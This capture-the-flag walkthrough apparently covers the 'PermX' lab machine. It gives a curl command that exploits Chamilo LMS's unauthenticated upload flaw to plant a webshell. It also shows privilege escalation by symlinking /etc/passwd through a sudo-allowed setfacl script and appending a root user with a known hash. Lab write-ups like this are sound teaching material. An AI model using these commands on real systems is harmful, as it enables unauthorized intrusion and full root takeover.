- Subdomain enumeration with ffuf spots `lms`,we don't need to check `www` it is just the normal `permx.htb` page

![image](https://github.com/user-attachments/assets/d0aa315e-6154-4454-902b-a92b7a6d86f5)

- Subdomain `lms.permx.htb` hosts a learning management portal `Chamilo`

![image](https://github.com/user-attachments/assets/41ce957a-202a-4200-861b-8ae530530ff5)

- Chamilo is vulnerable to unauthenticated file upload as explained in this [github repo](https://github.com/dollarboysushil/Chamilo-LMS-Unauthenticated-File-Upload-CVE-2023-4220)

--------------------------

### Exploiting Chamilo with curl

- Php page `/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported` allows us to upload any file type, we can upload a webshell
to execute commands

- I uploaded the file with curl

      ‚ùØ curl -F "bigUploadFile=@<shell filename>" "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
      The file has successfully been uploaded.%

- Access your web shell at route `/main/inc/lib/javascript/bigupload/files/[filename]`

- Shell access

![image](https://github.com/user-attachments/assets/6ce94f61-5a54-44cb-880b-7555fe3c87ee)
 
### USER MTZ

- I ran linpeas and discovered a password in a db config file. I was able to login to user `mtz` with the password

![image](https://github.com/user-attachments/assets/87932ed3-46d3-4532-88c6-c5d46198159c)

- User `mtz` access

![image](https://github.com/user-attachments/assets/ad7c7cca-a266-4708-8aa3-089ef80f3711)

---------------------

### PRIVESC with SETFACL

- I ran `sudo -l` and noticed a rule that user `mtz` can run a sh script `/opt/acl.sh` as root without passwd

![image](https://github.com/user-attachments/assets/7f748f6b-1d7e-439f-8d01-d334b46c64a2)

### Acl.sh

- The script's usage syntax is `acl.sh [user] [perm] [file]`
- The target file must be in `/home/mtz/*` file directory and must not contain `..` to prevent path traversal.

      if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
        /usr/bin/echo "Access denied."
        exit 1
- Then,this code checks if it is a file

        # Check if the path is a file
      if [ ! -f "$target" ]; then
          /usr/bin/echo "Target must be a file."
          exit 1
      fi
- Then, it runs `setfacl` to grant a user specific permissions in respect to a file.

      /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

----------------------

### Exploiting the ACL script

- We can exploit this by creating symbolic link of `/etc/passwd` in mtz's directory.After creating the symbolic link wiith write access to `/etc/passwd`,
we can edit and add a new user hash with root privileges.

![image](https://github.com/user-attachments/assets/57074117-d2e1-42fb-a2a7-8ee866fc06fd)

- We will copy this root hash to password to the passwd symbolic link,you can generate an hash with `openssl passwd [password]`.
This hash's password is `password123`.

      sensei:$1$1YY732V9$Irh.HtaGlscLmIz6SLQgM/:0:0:root:/root:/bin/bash

- Editing the passwd file

![image](https://github.com/user-attachments/assets/8e726103-03c1-490d-b623-d96d97c567dc)

- It reflects in `/etc/passwd`

![image](https://github.com/user-attachments/assets/93062d63-b64a-420f-9097-b24c94ce3bbb)

- You can automate it with this

       ln -s /etc/passwd ~/passwd
       sudo -u root /opt/acl.sh mtz rwx /home/mtz/passwd
       echo "sensei:\$1\$1YY732V9\$Irh.HtaGlscLmIz6SLQgM/:0:0:root:/root:/bin/bash" >> /home/mtz/passwd
       /usr/bin/echo "enter 'password123'"
       su sensei


- Access to user `sensei`

![image](https://github.com/user-attachments/assets/d1769749-3965-4804-a021-3b0962f6ed38)

- Root
